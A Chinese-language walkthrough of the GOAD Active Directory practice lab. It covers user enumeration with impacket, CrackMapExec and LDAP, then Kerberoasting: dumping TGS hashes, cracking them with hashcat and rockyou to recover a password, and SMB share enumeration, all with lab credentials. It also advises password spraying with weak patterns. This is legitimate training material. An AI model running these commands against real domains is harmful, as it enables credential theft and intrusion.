# GOAD 用户枚举
## 列出用户
* 当您在活动目录上获得一个帐户时，要做的第一件事总是**获得完整的用户列表**
* 一旦你得到它，你就可以在完整的用户列表上进行密码喷射(你经常会发现其他帐户的密码很弱，比如 username=password、SeasonYear!、SocietynameYear! 甚至 123456)
```bash
impacket-GetADUsers -all north.sevenkingdoms.local/brandon.stark:iseedeadpeople
```
```bash
mpacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Querying north.sevenkingdoms.local for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2023-05-31 01:24:31.039750  2023-05-31 05:57:19.443577 
Guest                                                 <never>              <never>             
vagrant                                               2021-05-12 07:38:55.922520  2023-05-31 06:22:46.154533 
krbtgt                                                2023-05-31 02:09:14.783719  <never>             
                                                      2023-05-31 02:19:15.062141  <never>             
arya.stark                                            2023-05-31 05:43:29.046383  2023-06-02 05:09:00.415651 
eddard.stark                                          2023-05-31 05:43:35.293315  2023-06-05 09:52:09.638037 
catelyn.stark                                         2023-05-31 05:43:41.067220  <never>             
robb.stark                                            2023-05-31 05:43:46.748632  2023-06-05 09:52:42.283337 
sansa.stark                                           2023-05-31 05:43:52.494612  <never>             
brandon.stark                                         2023-05-31 05:43:58.041093  2023-06-04 09:56:34.712310 
rickon.stark                                          2023-05-31 05:44:04.184710  <never>             
hodor                                                 2023-05-31 05:44:09.894722  <never>             
jon.snow                                              2023-05-31 05:44:15.433758  <never>             
samwell.tarly                                         2023-05-31 05:44:20.807653  <never>             
jeor.mormont                                          2023-05-31 05:44:25.852727  <never>             
sql_svc                                               2023-05-31 05:44:31.405820  2023-06-01 20:36:30.667229 
```
使用CME
```bash
crackmapexec smb -u samwell.tarly -p Heartsbane -d north.sevenkingdoms.local 192.168.56.11 --users
```
```bash
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       [+] north.sevenkingdoms.local\samwell.tarly:Heartsbane 
SMB         192.168.56.11   445    WINTERFELL       [+] Enumerated domain user(s)
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\sql_svc                        badpwdcount: 3 desc: sql service
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\jeor.mormont                   badpwdcount: 3 desc: Jeor Mormont
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\samwell.tarly                  badpwdcount: 3 desc: Samwell Tarly (Password : Heartsbane)
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\jon.snow                       badpwdcount: 3 desc: Jon Snow
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\hodor                          badpwdcount: 0 desc: Brainless Giant
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\rickon.stark                   badpwdcount: 3 desc: Rickon Stark
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\brandon.stark                  badpwdcount: 3 desc: Brandon Stark
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\sansa.stark                    badpwdcount: 3 desc: Sansa Stark
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\robb.stark                     badpwdcount: 0 desc: Robb Stark
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\catelyn.stark                  badpwdcount: 3 desc: Catelyn Stark
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\eddard.stark                   badpwdcount: 0 desc: Eddard Stark
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\arya.stark                     badpwdcount: 3 desc: Arya Stark
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\krbtgt                         badpwdcount: 3 desc: Key Distribution Center Service Account
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\vagrant                        badpwdcount: 0 desc: Vagrant User
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\Guest                          badpwdcount: 3 desc: Built-in account for guest access to the computer/domain
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\Administrator                  badpwdcount: 3 desc: Built-in account for administering the computer/domain
```
使用LDAP
[Useful LDAP queries for Windows Active Directory pentesting](https://podalirius.net/en/articles/useful-ldap-queries-for-windows-active-directory-pentesting/)
```bash
ldapsearch -H ldap://192.168.56.11 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b 'DC=north,DC=sevenkingdoms,DC=local' "(&(objectCategory=person)(objectClass=user))" |grep 'distinguishedName:'
```
```bash
distinguishedName: CN=Administrator,CN=Users,DC=north,DC=sevenkingdoms,DC=loca
distinguishedName: CN=Guest,CN=Users,DC=north,DC=sevenkingdoms,DC=local
distinguishedName: CN=vagrant,CN=Users,DC=north,DC=sevenkingdoms,DC=local
distinguishedName: CN=krbtgt,CN=Users,DC=north,DC=sevenkingdoms,DC=local
distinguishedName: CN=SEVENKINGDOMS$,CN=Users,DC=north,DC=sevenkingdoms,DC=loc
distinguishedName: CN=arya.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
distinguishedName: CN=eddard.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
distinguishedName: CN=catelyn.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=loca
distinguishedName: CN=robb.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
distinguishedName: CN=sansa.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
distinguishedName: CN=brandon.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=loca
distinguishedName: CN=rickon.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
distinguishedName: CN=hodor,CN=Users,DC=north,DC=sevenkingdoms,DC=local
distinguishedName: CN=jon.snow,CN=Users,DC=north,DC=sevenkingdoms,DC=local
distinguishedName: CN=samwell.tarly,CN=Users,DC=north,DC=sevenkingdoms,DC=loca
distinguishedName: CN=jeor.mormont,CN=Users,DC=north,DC=sevenkingdoms,DC=local
distinguishedName: CN=sql_svc,CN=Users,DC=north,DC=sevenkingdoms,DC=local
```
而且由于域信任的关系 我们可以使用ldap查询其他域内的用户
```bash
ldapsearch -H ldap://192.168.56.12 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b ',DC=essos,DC=local' "(&(objectCategory=person)(objectClass=user))"
```
```bash
ldap_bind: Invalid credentials (49)
	additional info: 80090308: LdapErr: DSID-0C09042A, comment: AcceptSecurityContext error, data 52e, v3839
```
```bash
ldapsearch -H ldap://192.168.56.10 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b 'DC=sevenkingdoms,DC=local' "(&(objectCategory=person)(objectClass=user))" |grep 'distinguishedName:'
```
```bash
distinguishedName: CN=Administrator,CN=Users,DC=sevenkingdoms,DC=local
distinguishedName: CN=Guest,CN=Users,DC=sevenkingdoms,DC=local
distinguishedName: CN=vagrant,CN=Users,DC=sevenkingdoms,DC=local
distinguishedName: CN=krbtgt,CN=Users,DC=sevenkingdoms,DC=local
distinguishedName: CN=NORTH$,CN=Users,DC=sevenkingdoms,DC=local
distinguishedName: CN=ESSOS$,CN=Users,DC=sevenkingdoms,DC=local
distinguishedName: CN=tywin.lannister,OU=Crownlands,DC=sevenkingdoms,DC=local
distinguishedName: CN=jaime.lannister,OU=Crownlands,DC=sevenkingdoms,DC=local
distinguishedName: CN=cersei.lannister,OU=Crownlands,DC=sevenkingdoms,DC=local
distinguishedName: CN=tyron.lannister,OU=Westerlands,DC=sevenkingdoms,DC=local
distinguishedName: CN=robert.baratheon,OU=Crownlands,DC=sevenkingdoms,DC=local
distinguishedName: CN=joffrey.baratheon,OU=Crownlands,DC=sevenkingdoms,DC=loca
distinguishedName: CN=renly.baratheon,OU=Crownlands,DC=sevenkingdoms,DC=local
distinguishedName: CN=stannis.baratheon,OU=Crownlands,DC=sevenkingdoms,DC=loca
distinguishedName: CN=petyer.baelish,OU=Crownlands,DC=sevenkingdoms,DC=local
distinguishedName: CN=lord.varys,OU=Crownlands,DC=sevenkingdoms,DC=local
distinguishedName: CN=maester.pycelle,OU=Crownlands,DC=sevenkingdoms,DC=local
```

## Kerberoasting

### Kerberos协议
[Kerberos协议概述](https://y4er.com/posts/kerberos-as_req-and-as_rep/):
>Kerberos是一种由MIT(麻省理工大学)提出的一种网络身份验证协议

>它旨在通过使用密钥加密技术为客户端/服务器应用程序提供强身份验证

>在Kerberos协议中主要是有三个角色的存在：
>1. 访问服务的Client(以下表述为Client 或者用户)
>2. 提供服务的Server(以下表述为服务)
>3. KDC(Key Distribution Center)密钥分发中心 kerberos 测试工具介绍

>其中KDC服务默认会安装在一个域的域控中，而Client和Server为域内的用户或者是服务，如HTTP服务，SQL服务在Kerberos中Client是否有权限访问Server端的服务由KDC发放的票据来决定

kerberos的简化认证认证过程如下图

![kerberos](/GOAD-Part4-Enumeration-User/imges/1.png)


1. AS_REQ: Client向KDC发起AS_REQ,请求凭据是Client hash加密的时间戳
2. AS_REP: KDC使用Client hash进行解密，如果结果正确就返回用krbtgt hash加密的TGT票据，TGT里面包含PAC,PAC包含Client的sid，Client所在的组
3. TGS_REQ: Client凭借TGT票据向KDC发起针对特定服务的TGS_REQ请求
4. TGS_REP: KDC使用krbtgt hash进行解密，如果结果正确，就返回用服务hash 加密的TGS票据(这一步不管用户有没有访问服务的权限，只要TGT正确，就返回TGS票据)
5. AP_REQ: Client拿着TGS票据去请求服务
6. AP_REP: 服务使用自己的hash解密TGS票据如果解密正确，就拿着PAC去KDC那边问Client有没有访问权限，域控解密PAC获取Client的sid，以及所在的组，再根据该服务的ACL，判断Client是否有访问服务的权限


### SPN简介
SPN简介:
> SPN(ServicePrincipal Names)服务主体名称，是服务实例(比如：HTTP、MSSQL、MySQL等服务)的唯一标识符
> SPN是服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN

> SPN分为两种，一种注册在AD上机器帐户(Computers)下，另一种注册在域用户帐户(Users)下

> 当一个服务的权限为Local System或Network Service，则SPN注册在机器帐户(Computers)下

> 当一个服务的权限为一个域用户，则SPN注册在域用户帐户(Users)下

SPN的格式:
```bash
serviceclass/host:port/servicename
```
1. serviceclass可以理解为服务的名称，常见的有www, ldap, SMTP, DNS, HOST等
2. host有两种形式，FQDN和NetBIOS名，例如server01.test.com和server01
3. 如果服务运行在默认端口上，则端口号(port)可以省略

**kerberoasting：**
>通过SPN发现服务(比如MSSQL)

>具有域内普通用户权限

>向SPN服务进行交互,请求Kerberos票据(当用户的TGT被验证为有效时，TGS会向用户发送一张票据，该票据使用与SPN关联服务的计算机服务账号相同的NTLM Hash，比如MSSQL账户的Hash)

>根据字典爆破生成Hash,去尝试打开该Kerberos票据

>如果成功,则获得了MSSQL服务账户的密码

>攻击者可以伪造TGS白银票据,在TGS中标识访问账号为域管理员账号 从而获取服务的域管理员访问权限

>或者用于委派攻击(服务账号大多都会被设置委派，如果是非约束委派，则获取服务账号的口令后，可直接获取域管理员权限)

* 在活动目录中，我们经常会看到设置了 SPN 的用户

使用impacket
```bash
GetUserSPNs.py -request -dc-ip 192.168.56.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople -outputfile kerberoasting.hashes
```
```bash
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName                                 Name      MemberOf                                                    PasswordLastSet             LastLogon                   Delegation  
---------------------------------------------------  --------  ----------------------------------------------------------  --------------------------  --------------------------  -----------
CIFS/winterfell.north.sevenkingdoms.local            jon.snow  CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local  2023-05-31 05:44:15.433758  <never>                     constrained 
HTTP/thewall.north.sevenkingdoms.local               jon.snow  CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local  2023-05-31 05:44:15.433758  <never>                     constrained 
MSSQLSvc/castelblack.north.sevenkingdoms.local       sql_svc                                                               2023-05-31 05:44:31.405820  2023-06-01 20:36:30.667229              
MSSQLSvc/castelblack.north.sevenkingdoms.local:1433  sql_svc                                                               2023-05-31 05:44:31.405820  2023-06-01 20:36:30.667229              



[-] CCache file is not found. Skipping...
```
使用CME
```bash
cme ldap 192.168.56.11 -u brandon.stark -p 'iseedeadpeople' -d north.sevenkingdoms.local --kerberoasting KERBEROASTING
```
```bash
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
LDAP        192.168.56.11   389    WINTERFELL       [+] north.sevenkingdoms.local\brandon.stark:iseedeadpeople 
LDAP        192.168.56.11   389    WINTERFELL       [*] Total of records returned 4
CRITICAL:impacket:CCache file is not found. Skipping...
LDAP        192.168.56.11   389    WINTERFELL       sAMAccountName: jon.snow memberOf: CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local pwdLastSet: 2023-05-31 05:44:15.433758 lastLogon:<never>
LDAP        192.168.56.11   389    WINTERFELL       $krb5tgs$23$*jon.snow$NORTH.SEVENKINGDOMS.LOCAL$north.sevenkingdoms.local/jon.snow*$d507398bd4a3dae199174e3dd0c2e3d7$366ed44e82df36262a27fef3bc822122199622e5e170d760629fad37b8c8def958a7818a6734f566d0c2d85d091d865de8c2b79127e29076cdb9a5409d6cdbaf3600bbfe5d743b73c9fba0c0d91b7155227a91ea7b0c7cdcf7ffb221351b80280d6e285fadcc54d32da036bfcb0a323ee87daf9919cf6c3511deda75d90a53c1fb9a2d3f34783172af45fc9b4e88a24942f2638fb955c6ff51cdcb439b4646bb81a16ca04593b08ba541d49492a719a1c3b8f6302a5d6d14f116558b1782d0e942b9e5287b41fc74afbae633c0c64e6cfc47575eba7e8db231ebba663191b7d2af7f018e2d8efe10a9db3aebf3a8b00a066067730cd8cce6866be0b9cff1b5d639a3f9f1d47fafef14b61d30f807f30f2deba60227909a0849d11f9e821ebb1fd49afed404bfcb8821e8bdd53923662e09012e5c6f01200ccaf509a79301466782d2a23f366c7b5b657e92a05ba17c9b81dbc93745173977cc72df7e3b438c580155173cdbc6228eda62aa090f8d81cf9d6ea636e8d4ea45cc396889415c3d7db9888cf0626f2cc01d7fe99099a31d114a2fd6833bf3c52f0ac73eb7ab49018e7500e4c6d569683ebb775c358aa14ccccb482954f027570435c4ce7bdc3e843f8d67a8177d6574acabdf1a139898630195f4259ac2b737d4638306b2f2cefc2dff7722ac49471f227998fafbbefe45a354d97fd7626e57a9b2bc9a15cede05fd0f4c4bc8dbd0cc0602adfe001b348317136e2eb4ad3309bc56ea3b097d66dfb0628a1b99ad18e38786d774e927ef0deb5a6f87595b2ab43a3ab8dd5b64aa30f4dca2c97772536ad8991385c80a2cad14d03c0fef7f021de12faf467c2464c6a3885db03d25fe15d901263aebfdc297cea3e823d7dabdac165095b9f5618bc299db1614c4dcb235d06176a8c53174cb5e432332219acc7c1996dd7ecc63a607f55310a1561531acee5c0a55adcd7bff31c70660a229ec340547bb289204150c00f2ec95e12958ac5f0a0e7c11d565ef50a93bd3a8fc2acd59f9309d98ddfcf62402894f0bd6909210354a173524d14eb8386ac535a85aa677b5bd1aaf0836898ef2f5ecf5f18bb77b7584e1c88aa308cb19ba0acb78f614f30036de4bb63a15450d72adc4eeb017b342bcfae3d54eb5aa6691bca18c0f7a20e661727cbaa41a6b470de74bedd015f7e1cad32bd612450cf95cae184d54379d3ef4abff26fa8489035ff2d61bf6a77f9bc65c82c01f05b802f3be57e40cfb856d3f0ce09f46ee443dc6fedf24e468ef85ba00a29af87a89e9c985e50f7d4396bc72f5bf11b79438c91b38911a4d0a365f7dfb8febe7461f79b8ea35fad03f724a634e06b12ae3c5701c9fd8e6773df46806778abae4de00854b3487795d00a07f462a9eea88ad84558db1995a617b3ad17ee3caac7b18c2568e8b44d7357ff5a8d131c8bcb519195fdec3701c9dd24c9e896db54e52fb2846898ead0a8d80fb3f473b49290e09210053e86bbf91cb70941843ab0032c67b776154a803247138fdb1f3fe6ca51a6c9fd668d5da5c888ac2d36e13a23ef13f63238de63c1e3060b8c436d862e5602fc1625d40e8a5789e207611643cef7a47ea06ef9c89be8e3a75034b756d318b999229831188251099438f58db0d47ef278330fd1349b648
LDAP        192.168.56.11   389    WINTERFELL       sAMAccountName: sql_svc memberOf:  pwdLastSet: 2023-05-31 05:44:31.405820 lastLogon:2023-06-01 20:36:30.667229
LDAP        192.168.56.11   389    WINTERFELL       $krb5tgs$23$*sql_svc$NORTH.SEVENKINGDOMS.LOCAL$north.sevenkingdoms.local/sql_svc*$07a49246e2d3a67a40abfb7760bd2746$3a40d816bd65e125919af362116d3e168f820ec871a13d05214124fdbd8cc98fd41cf66378cdc9b35857d92a7914a7982830babb5c6057332545dbb1879254cd3d6bfac64f0723ca3b6ece658bbde813990c0fb728c697f2b0bf73ab3cf72ac24a80022ebfad439a629ff151af37c291f3aaffeb5627fccab9b17ab0a3ee440108aea5f2aaf62b44290d9d3148fbdd90f247d4ad19c85ef224214013de8d3f5d171a1da157f048d1c514294b00976207b26f70e782601bca0740d05a795c66ea1eadc44da1d9a5ebbf4ecc9ec9cd415aad8e2d09a302be2d455a674ca36f256ba1344bd8417b0be1e88005780a9c37caa2af059ac26629539dfb0942175e50b0b7af84480b123a54c80324465f965055096dfe87a6499fe009e626dbb897b397ce8e4900798b4d272ab824a182a1bdecf55fc3ec0de7555e36b62d91e29ee58cf2bffcc1381d2bd9ce8022ca55dd5f9af8b2b0d5bc86070c4d6305d722b6c86ce40efd8d9419bc7083f2561ec1985e03630e28b268b92446c803ec9b1af8ccd2a5540edab221fc9fb0c1a90191301eaaa13c051a1692ce023fa20f09d4d871f3876cb1411e389c31afc55fbf855346e839f281c4330bb39fee72588bf32897e336395b55feeae910526f0cb692e6dc2628f5b89ee1d09cd7dd70ae760589f881b7d7ce42c795e1c123012d97df0c9e5e4b79478b763357d4afb5624bfbdddef1fcb2573177576a8aec3bd12ca0ef88d991804f63046315a8919707e075b3442cee5ede9bc8f4075595270cfde7ea3e5a7258a3f912108c1cdd6ca95f8d67c7f5f8dacc1beeabf49854e1445385f8fe4fb9a65ef43cf9426c51df1fb6b802f5bdc804dd15611d9e4da1f0d86f26306e0d686da101ffa24d948398c1e1406040c9d6cacc9ecf49c1256592fb92352d749df74a6a87f65bc3c3e6ab842a40d802a184af916efe819cb9744df229cae382424d4b9081c4e440feffdf6181b9e2ac00a11220c7e47bfcc682310745e9c5c63e64de7f118c259bfe216f8e20ec15919f463b82d3ac5af0a80f3068987b2961d7e874d81855c58be7df0389a22e7243b0a0b5327d055e1393972bfac0b0bea3f0301ad97cd5c79370329ab86d9f8c538313e3e1ad9a2ffe766e96b6570148af3a4ee9d8d43b47ef7f654a273b8dcf9ce90603bf657a748ef93106bfc5699abc1599be735824e4621e2d8ac9461e490a2a6280708bccca49a2161c44d3117dc7c0614da326045aab60120b5fd564b54f1c3b4ff1ee11137b79399b51998545cdc8aae07cfe99b4de4a3db7514857974977794b20d1a4ace4f05270ecd50089190bfaf5b5fa05ca2f190a0c74d014f873506b22b193e62df0ea11e2fda8a94cdfbecb998fd64e95f1f4f8b2f16386f30e6ac2552df69f08fd960c39cba8ceac2aed03ad94df59b2781715ffa2edf37c6d862814e344ee2ba59ce1f1a6f738b53f9597564588b4d61a4df384724c44e123fddd8b3fe57c0723305cc944fb5ebb8bf3ae9232ff59fe114b99781250f84151ea0198b5712316cc50b85b6f91adb29fc9d22228f8f6b7948f4b73220affc68ce0d7336d33070bf7f09ae6384096b0f7cf65b7babf53b433d6fae56f6e0fa05b7bd619041abbda6c79dcf5ff530a34aade24d8689ec40f30
```
使用hashcat
```bash
hashcat -a 0 -m 13100 kerberoasting.hashes /usr/share/wordlists/rockyou.txt
``` 
```bash
$krb5tgs$23$*jon.snow$NORTH.SEVENKINGDOMS.LOCAL$north.sevenkingdoms.local/jon.snow*$6f2238acaf9fc98555c3898e93328ca6$9ffc72abcef96ae635f663c7a736966706bf711d99d5f3a184ee5930f384be1aa0fdc2f4e4dd242ffd29f72c6e6694ac46a5e132b10d2405e3fd485674daebccaee9343f995c944ebfa1c25542e593a4abc1aaae9674b37d4c757a5369dfcb08bb5cda47870d53cffd0e27f21d4c310f9f849648ee61fe4cc337e95a37de8ca96d3b758bbc7dfd2919c54b26607248efe6cbade9655e23af6fa17788961dc10598ec38056541e308dd14e55f65508298fd7f365a24eeb9ae341d0733d72403b315a12aade76a321318f68fee896785c40fd3aa12fee34e880ebeb956bf7b1c2ec2e846383c64be753ae39cee11840509f56b6d7b6d0752431c3d1469d7c515441a3545df0427a6681bac35c4eeca2abdf8fc1fe2e7f8877328350e2c25fd959fef71ac7805d5bc7a20a09c4c0987877aac88f4f0065a3fa035a7f2fd64fdc5c4b07048276f3b6b65ef29383525ad3658e430bda5d0544416fefa0c67b3dafab13c01d771ff3978b1bfb30245d2b3d3de4b645d77a998a427da3703f8adfb3765801ef6c926ce15379ea681e37f1e11fa1f08d8f0d2f98cde36849854b0f08580c4ee336811de1da47c17dc74b3f8827c2fbba6860bd0a02d5ef017db2da14f73ccd4b0c03986dfe27bbfc32a5737e1c3ff1a7a01ebfd337841eb7ed7bcffb355e3aea59954d3e90bde7c83034f4f0ed002be2e25e536eb5f0f068625aeef613e481cb10ecd8578565e203d58f9a73362fd33b2295f3dc5dc74b30c4c550aa5736ab5b3b0ee738cc24ef85c487f104781571e6815d40e838ec4dd36679c5bdcdfa51f5736439c72003790fd24905ca9fc1b71062fc71b9983692c221c6da138a8250fa33b8d82ab8d3631378e81f4c74d4a29c754f9f918754e9a374e10091cc34bcae7579e728331230cc86ddf2b941d37fc0bb422c43bd7b410e5934d28c34922603f88ad065968b027172fc712c66c4929fdb6091ac99fe5cedfd48861b59e8576019cec31a18f550cb62621ad63ba10157326c822c53a5c0d576fa71e0cd1fbf55f7e7209d8f8afe7ee4527df9dc5254e75e7761b507e96368211de549ca14b35ab1c01d6662a823c3ac4421add47036f51eb62be3aaaa76f7f410e095eda8421b07454a52a35af66308dcff531c3e23a2bf2a125225b8fc16a9ec97eff7176f1873684e92677215bdfb5140aabc0022ac35a51c017e2ef62184340208ff365f020abd5b5d996ac12cece5db59a35c94c7a5093de3a2d48ccd72e5cac577722b3eb42a1c804556e65a0083031de5229502b98006b22982f022fdaee30c0e55a194c10c4caebc58730e9e03f177499b039389e9c623f13c13ebaea438fd1e3b071776e00ab6fd8846d54a32a484c1ec5601b57d0246c520abe10889cabafc085102dcdf05c3bbb35b725aba2e076ae990db192d403093d27d578074b3ae9968d652439e7e84597f4ecf83dfe417ca10d211639162ed05732e2db760b95ad3a27a50f988957244c88d2d4a739fc8598cf39477c2d4a5c597c377bd347e840804c9a06290504dd48686576eff281b52c3626c0b83aaded36ab6b8cc4087b8cd7e07622f88ffa4af89138fc6b1de96a67e52e1025ec5e0015ca3775575b11c0db7e6adba1afa96aee9c1ee7c0555a9097a4a216aa14aa0d:iknownothing
```
获取另一个用户账户密码
* north.sevenkingdoms.local\jon.snow:iknownothing

## 共享枚举
使用刚才的获得账号密码尝试,有个新的共享文件夹是可读的(在该靶场里什么都没有，但在真正的渗透中可能会经常得到有趣的信息)

```bash
crackmapexec smb 192.168.56.10-23 -u jon.snow -p iknownothing -d north.sevenkingdoms.local --shares
```

<details>
<summary>展开查看</summary>
<pre><code class="bash">
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.12   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:True)
SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10.0 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
SMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10.0 Build 17763 x64 (name:KINGSLANDING) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:True)
SMB         192.168.56.11   445    WINTERFELL       [+] north.sevenkingdoms.local\jon.snow:iknownothing 
SMB         192.168.56.11   445    WINTERFELL       [+] Enumerated shares
SMB         192.168.56.11   445    WINTERFELL       Share           Permissions     Remark
SMB         192.168.56.11   445    WINTERFELL       -----           -----------     ------
SMB         192.168.56.11   445    WINTERFELL       ADMIN$                          Remote Admin
SMB         192.168.56.11   445    WINTERFELL       C$                              Default share
SMB         192.168.56.11   445    WINTERFELL       IPC$            READ            Remote IPC
SMB         192.168.56.11   445    WINTERFELL       NETLOGON        READ            Logon server share 
SMB         192.168.56.11   445    WINTERFELL       SYSVOL          READ            Logon server share 
SMB         192.168.56.12   445    MEEREEN          [+] north.sevenkingdoms.local\jon.snow:iknownothing 
SMB         192.168.56.12   445    MEEREEN          [+] Enumerated shares
SMB         192.168.56.12   445    MEEREEN          Share           Permissions     Remark
SMB         192.168.56.12   445    MEEREEN          -----           -----------     ------
SMB         192.168.56.12   445    MEEREEN          ADMIN$                          Remote Admin
SMB         192.168.56.12   445    MEEREEN          C$                              Default share
SMB         192.168.56.12   445    MEEREEN          IPC$                            Remote IPC
SMB         192.168.56.12   445    MEEREEN          NETLOGON        READ            Logon server share 
SMB         192.168.56.12   445    MEEREEN          SYSVOL          READ            Logon server share 
SMB         192.168.56.22   445    CASTELBLACK      [+] north.sevenkingdoms.local\jon.snow:iknownothing 
SMB         192.168.56.10   445    KINGSLANDING     [+] north.sevenkingdoms.local\jon.snow:iknownothing 
SMB         192.168.56.23   445    BRAAVOS          [+] north.sevenkingdoms.local\jon.snow:iknownothing 
SMB         192.168.56.22   445    CASTELBLACK      [+] Enumerated shares
SMB         192.168.56.22   445    CASTELBLACK      Share           Permissions     Remark
SMB         192.168.56.22   445    CASTELBLACK      -----           -----------     ------
SMB         192.168.56.22   445    CASTELBLACK      ADMIN$                          Remote Admin
SMB         192.168.56.22   445    CASTELBLACK      all             READ,WRITE      Basic RW share for all
SMB         192.168.56.22   445    CASTELBLACK      C$                              Default share
SMB         192.168.56.22   445    CASTELBLACK      IPC$            READ            Remote IPC
SMB         192.168.56.22   445    CASTELBLACK      public          READ            Basic Read share for all domain users
SMB         192.168.56.10   445    KINGSLANDING     [+] Enumerated shares
SMB         192.168.56.10   445    KINGSLANDING     Share           Permissions     Remark
SMB         192.168.56.10   445    KINGSLANDING     -----           -----------     ------
SMB         192.168.56.10   445    KINGSLANDING     ADMIN$                          Remote Admin
SMB         192.168.56.10   445    KINGSLANDING     C$                              Default share
SMB         192.168.56.10   445    KINGSLANDING     CertEnroll      READ            Active Directory Certificate Services share
SMB         192.168.56.10   445    KINGSLANDING     IPC$            READ            Remote IPC
SMB         192.168.56.10   445    KINGSLANDING     NETLOGON        READ            Logon server share 
SMB         192.168.56.10   445    KINGSLANDING     SYSVOL          READ            Logon server share 
SMB         192.168.56.23   445    BRAAVOS          [+] Enumerated shares
SMB         192.168.56.23   445    BRAAVOS          Share           Permissions     Remark
SMB         192.168.56.23   445    BRAAVOS          -----           -----------     ------
SMB         192.168.56.23   445    BRAAVOS          ADMIN$                          Remote Admin
SMB         192.168.56.23   445    BRAAVOS          all             READ,WRITE      Basic RW share for all
SMB         192.168.56.23   445    BRAAVOS          C$                              Default share
SMB         192.168.56.23   445    BRAAVOS          CertEnroll      READ            Active Directory Certificate Services share
SMB         192.168.56.23   445    BRAAVOS          IPC$                            Remote IPC
SMB         192.168.56.23   445    BRAAVOS          public          READ,WRITE      Basic Read share for all domain users
</code></pre>
</details>

```bash
crackmapexec smb 192.168.56.10-23 -u samwell.tarly  -p Heartsbane -d north.sevenkingdoms.local --shares
```

<details>
<summary>展开查看</summary>
<pre><code class="bash">
SMB         192.168.56.12   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:True)
SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10.0 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:True)
SMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10.0 Build 17763 x64 (name:KINGSLANDING) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.12   445    MEEREEN          [+] north.sevenkingdoms.local\samwell.tarly:Heartsbane 
SMB         192.168.56.22   445    CASTELBLACK      [+] north.sevenkingdoms.local\samwell.tarly:Heartsbane 
SMB         192.168.56.11   445    WINTERFELL       [+] north.sevenkingdoms.local\samwell.tarly:Heartsbane 
SMB         192.168.56.12   445    MEEREEN          [+] Enumerated shares
SMB         192.168.56.12   445    MEEREEN          Share           Permissions     Remark
SMB         192.168.56.12   445    MEEREEN          -----           -----------     ------
SMB         192.168.56.12   445    MEEREEN          ADMIN$                          Remote Admin
SMB         192.168.56.12   445    MEEREEN          C$                              Default share
SMB         192.168.56.12   445    MEEREEN          IPC$                            Remote IPC
SMB         192.168.56.12   445    MEEREEN          NETLOGON        READ            Logon server share 
SMB         192.168.56.12   445    MEEREEN          SYSVOL          READ            Logon server share 
